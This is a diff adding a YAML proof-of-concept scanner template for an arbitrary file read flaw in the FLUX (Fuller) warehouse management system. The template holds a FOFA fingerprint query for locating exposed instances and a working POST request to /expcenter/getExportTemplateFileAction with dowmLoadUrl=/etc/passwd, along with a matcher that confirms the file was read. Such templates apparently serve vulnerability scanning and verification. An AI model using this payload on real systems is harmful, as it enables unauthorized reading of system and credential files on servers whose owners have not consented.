@@ -1,0 +1,19 @@
+id: poc-yaml-flux-wms-getexporttemplatefileaction-anyfile-read
+info:
+  name: 富勒仓储管理系统 getExportTemplateFileAction 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 富勒仓储管理系统
+  fofa: body="/logincenterapp/ValidateImageService" || title="FLUX WMS生产环境"
+requests:
+- method: POST
+  path: /expcenter/getExportTemplateFileAction
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: dowmLoadUrl=/etc/passwd&fileName=
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"filename=\") &&\ncontains(content_type,\"application/force-download\"\
+    ) &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
